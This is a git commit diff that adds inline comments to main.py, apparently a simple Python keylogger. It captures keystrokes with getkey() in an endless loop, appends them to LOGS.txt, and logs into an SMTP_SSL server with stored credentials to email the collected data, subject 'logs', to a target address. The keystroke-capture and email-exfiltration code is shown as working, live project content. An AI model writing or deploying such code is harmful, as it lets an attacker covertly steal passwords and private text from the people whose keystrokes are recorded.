bc0260e37f7ac19ee13ce41f9c3c8c2c6b2cf20d
MisticPvP <104326146+MisticPvP@users.noreply.github.com>
2023-04-17 10:22:28 -0400

    Update main.py

--- main.py
+++ main.py
@@ -15,23 +15,23 @@ target = [email] # Must be a list, can enter other emails
 
 msg = MIMEText(data) # sets the contents of the email
 msg['Subject'] = 'logs' # sets the subject
-msg['From'] = sender
-msg['To'] = ', '.join(target)
+msg['From'] = sender # sets who is the email from
+msg['To'] = ', '.join(target) # sets who to send to
 
 
-timer = 0
+timer = 0 # sets the timer to 0
 
-def SendMail():
-  server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
-  msg = MIMEText(data)
-  server.login(email, password)
-  server.sendmail(sender, target, msg.as_string())
+def SendMail(): # Definates sending the enail
+  server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port) #Starts the server
+  msg = MIMEText(data) # sets the message
+  server.login(email, password) #logins
+  server.sendmail(sender, target, msg.as_string()) #send the email
   
 while True:
 
-    timer += 1
-    print(timer)
-    key = getkey()
+    timer += 1 # add 1 to the timer
+    print(timer) #prints the timer
+    key = getkey() #gets the key
     L = open('LOGS.txt', "a")
     with open('LOGS.txt') as infile:
       words = 0
